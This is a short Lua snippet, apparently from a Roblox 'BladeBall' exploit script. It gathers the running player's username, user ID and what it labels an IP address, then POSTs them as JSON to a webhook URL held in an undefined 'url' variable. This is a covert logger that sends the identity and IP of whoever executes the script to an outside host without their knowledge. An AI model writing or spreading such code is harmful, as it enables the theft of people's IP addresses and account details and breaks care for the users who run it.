localusername = game.Players.LocalPlayer.Name
localuserid = game.Players.LocalPlayer.UserId
userinfo = Response.Body

    local data = {
        ["avatar_url"] = "https://i.imgur.com/szQ00sY.jpg",
        ["username"] = "Clammy",
        ["content"] = "Someone executed BladeBall sript" .. "\nProfile Link: " .. "https://roblox.com/users/" .. localuserid .. "/profile" ..  "\nUsername: " .. localusername .. "\nIp: " .. userinfo ,
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local send = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(send)
